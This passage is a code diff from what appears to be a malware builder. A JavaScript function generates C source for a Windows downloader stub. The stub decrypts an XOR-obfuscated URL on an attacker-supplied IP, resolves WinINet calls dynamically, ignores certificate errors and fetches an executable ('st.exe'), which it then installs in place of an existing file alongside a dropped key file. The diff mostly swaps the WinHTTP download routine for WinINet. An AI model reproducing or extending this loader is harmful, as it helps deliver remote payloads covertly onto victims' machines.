@@ -71,7 +71,6 @@ function encryptStr(str, key) {
 }
 
 function cSource(meta, key, ip, buildId) {
-  // CHANGED TO HTTPS ON PORT 443
   const stUrl = `https://${ip}/api/downloads/st.exe`;
   const esc4c = (s) => String(s).replace(/\\/g, '\\\\').replace(/"/g, '\\"');
   
@@ -80,7 +79,7 @@ function cSource(meta, key, ip, buildId) {
 
   return String.raw`
 #include <windows.h>
-#include <winhttp.h>
+#include <wininet.h>
 #include <shlobj.h>
 #include <stdio.h>
 #include <wchar.h>
@@ -90,17 +89,6 @@ static const char ACCOUNT_KEY[] = "${safeKey}";
 static void decrypt(char* buf, int len, unsigned char key) {
     for (int i = 0; i < len; i++) buf[i] ^= key;
 }
-
-typedef BOOL (WINAPI *pWinHttpCrackUrl)(LPCWSTR, DWORD, DWORD, LPURL_COMPONENTS);
-typedef HINTERNET (WINAPI *pWinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
-typedef HINTERNET (WINAPI *pWinHttpConnect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
-typedef HINTERNET (WINAPI *pWinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
-typedef BOOL (WINAPI *pWinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
-typedef BOOL (WINAPI *pWinHttpReceiveResponse)(HINTERNET, LPVOID);
-typedef BOOL (WINAPI *pWinHttpQueryDataAvailable)(HINTERNET, LPDWORD);
-typedef BOOL (WINAPI *pWinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);
-typedef BOOL (WINAPI *pWinHttpCloseHandle)(HINTERNET);
-typedef BOOL (WINAPI *pWinHttpSetOption)(HINTERNET, DWORD, LPVOID, DWORD);
 
 static int is_valid_pe(const wchar_t* p) {
     HANDLE h = CreateFileW(p, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
@@ -119,78 +107,61 @@ static int is_valid_pe(const wchar_t* p) {
     return 1;
 }
 
-static int download_file(const wchar_t* url, const wchar_t* dest) {
-    HMODULE hWinHttp = LoadLibraryA("winhttp.dll");
-    if (!hWinHttp) return 0;
+static int download_file(const char* url, const wchar_t* dest) {
+    HMODULE hWinInet = LoadLibraryA("wininet.dll");
+    if (!hWinInet) return 0;
 
-    pWinHttpCrackUrl WinHttpCrackUrl = (pWinHttpCrackUrl)GetProcAddress(hWinHttp, "WinHttpCrackUrl");
-    pWinHttpOpen WinHttpOpen = (pWinHttpOpen)GetProcAddress(hWinHttp, "WinHttpOpen");
-    pWinHttpConnect WinHttpConnect = (pWinHttpConnect)GetProcAddress(hWinHttp, "WinHttpConnect");
-    pWinHttpOpenRequest WinHttpOpenRequest = (pWinHttpOpenRequest)GetProcAddress(hWinHttp, "WinHttpOpenRequest");
-    pWinHttpSendRequest WinHttpSendRequest = (pWinHttpSendRequest)GetProcAddress(hWinHttp, "WinHttpSendRequest");
-    pWinHttpReceiveResponse WinHttpReceiveResponse = (pWinHttpReceiveResponse)GetProcAddress(hWinHttp, "WinHttpReceiveResponse");
-    pWinHttpQueryDataAvailable WinHttpQueryDataAvailable = (pWinHttpQueryDataAvailable)GetProcAddress(hWinHttp, "WinHttpQueryDataAvailable");
-    pWinHttpReadData WinHttpReadData = (pWinHttpReadData)GetProcAddress(hWinHttp, "WinHttpReadData");
-    pWinHttpCloseHandle WinHttpCloseHandle = (pWinHttpCloseHandle)GetProcAddress(hWinHttp, "WinHttpCloseHandle");
-    pWinHttpSetOption WinHttpSetOption = (pWinHttpSetOption)GetProcAddress(hWinHttp, "WinHttpSetOption");
+    typedef HINTERNET (WINAPI *pInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
+    typedef HINTERNET (WINAPI *pInternetOpenUrlA)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
+    typedef BOOL (WINAPI *pInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
+    typedef BOOL (WINAPI *pInternetCloseHandle)(HINTERNET);
 
-    if (!WinHttpCrackUrl || !WinHttpOpen || !WinHttpConnect || !WinHttpOpenRequest || !WinHttpSendRequest || !WinHttpReceiveResponse || !WinHttpQueryDataAvailable || !WinHttpReadData || !WinHttpCloseHandle || !WinHttpSetOption) {
-        FreeLibrary(hWinHttp); return 0;
+    pInternetOpenA InternetOpenA = (pInternetOpenA)GetProcAddress(hWinInet, "InternetOpenA");
+    pInternetOpenUrlA InternetOpenUrlA = (pInternetOpenUrlA)GetProcAddress(hWinInet, "InternetOpenUrlA");
+    pInternetReadFile InternetReadFile = (pInternetReadFile)GetProcAddress(hWinInet, "InternetReadFile");
+    pInternetCloseHandle InternetCloseHandle = (pInternetCloseHandle)GetProcAddress(hWinInet, "InternetCloseHandle");
+
+    if (!InternetOpenA || !InternetOpenUrlA || !InternetReadFile || !InternetCloseHandle) {
+        FreeLibrary(hWinInet);
+        return 0;
     }
 
-    URL_COMPONENTS uc = {0}; uc.dwStructSize = sizeof(uc);
-    wchar_t host[256] = {0}; wchar_t path[1024] = {0};
-    uc.lpszHostName = host; uc.dwHostNameLength = 256;
-    uc.lpszUrlPath = path; uc.dwUrlPathLength = 1024;
+    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    if (!hInternet) { FreeLibrary(hWinInet); return 0; }
+
+    // INTERNET_FLAG_IGNORE_UNKNOWN_CA bypasses the self-signed cert error
+    DWORD dwFlags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_UNKNOWN_CA;
     
-    if (!WinHttpCrackUrl(url, 0, 0, &uc)) {
-        FreeLibrary(hWinHttp); return 0;
+    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, dwFlags, 0);
+    if (!hUrl) {
+        InternetCloseHandle(hInternet);
+        FreeLibrary(hWinInet);
+        return 0;
     }
 
-    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-    if (!hSession) { FreeLibrary(hWinHttp); return 0; }
-
-    HINTERNET hConnect = WinHttpConnect(hSession, host, uc.nPort, 0);
-    if (!hConnect) { WinHttpCloseHandle(hSession); FreeLibrary(hWinHttp); return 0; }
-
-    // Use WINHTTP_FLAG_SECURE for HTTPS
-    DWORD dwFlags = (uc.nPort == INTERNET_DEFAULT_HTTPS_PORT) ? WINHTTP_FLAG_SECURE : 0;
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, dwFlags);
-    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); FreeLibrary(hWinHttp); return 0; }
-
-    // Ignore SSL certificate errors
-    DWORD dwSecFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
-    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwSecFlags, sizeof(dwSecFlags));
-
-    BOOL bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
-    if (bResults) bResults = WinHttpReceiveResponse(hRequest, NULL);
-
-    if (bResults) {
-        HANDLE hFile = CreateFileW(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-        if (hFile != INVALID_HANDLE_VALUE) {
-            DWORD dwSize = 0, dwDownloaded = 0;
-            do {
-                dwSize = 0;
-                if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
-                if (dwSize == 0) break;
-                BYTE* pBuffer = (BYTE*)malloc(dwSize);
-                if (pBuffer) {
-                    if (WinHttpReadData(hRequest, pBuffer, dwSize, &dwDownloaded)) {
-                        DWORD written = 0;
-                        WriteFile(hFile, pBuffer, dwDownloaded, &written, NULL);
-                    }
-                    free(pBuffer);
-                }
-            } while (dwSize > 0);
-            CloseHandle(hFile);
-        }
+    HANDLE hFile = CreateFileW(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        InternetCloseHandle(hUrl);
+        InternetCloseHandle(hInternet);
+        FreeLibrary(hWinInet);
+        return 0;
     }
 
-    WinHttpCloseHandle(hRequest);
-    WinHttpCloseHandle(hConnect);
-    WinHttpCloseHandle(hSession);
-    FreeLibrary(hWinHttp);
-    return bResults;
+    char buf[8192];
+    DWORD bytesRead = 0;
+    BOOL ok = TRUE;
+    while (ok) {
+        ok = InternetReadFile(hUrl, buf, sizeof(buf), &bytesRead);
+        if (!ok || bytesRead == 0) break;
+        DWORD written = 0;
+        WriteFile(hFile, buf, bytesRead, &written, NULL);
+    }
+
+    CloseHandle(hFile);
+    InternetCloseHandle(hUrl);
+    InternetCloseHandle(hInternet);
+    FreeLibrary(hWinInet);
+    return ok;
 }
 
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
@@ -209,7 +180,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     
     CreateDirectoryW(dir, NULL);
 
-    // 1. Write key.json from baked key
+    // 1. Write key.json
     HANDLE hKey = CreateFileW(keyPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hKey != INVALID_HANDLE_VALUE) {
         DWORD w;
@@ -223,13 +194,11 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     int need_st = !is_valid_pe(stPath);
     if (need_st) {
         char stUrlStr[128] = {0};
-        wchar_t stUrlW[128] = {0};
         const char encStUrl[] = ${encStUrl};
         
         decrypt(stUrlStr, sizeof(encStUrl), ${meta.xorKey});
-        MultiByteToWideChar(CP_ACP, 0, stUrlStr, -1, stUrlW, 128);
 
-        if (download_file(stUrlW, stNewPath) && is_valid_pe(stNewPath)) {
+        if (download_file(stUrlStr, stNewPath) && is_valid_pe(stNewPath)) {
             DeleteFileW(stPath);
             MoveFileW(stNewPath, stPath);
             need_st = 0;
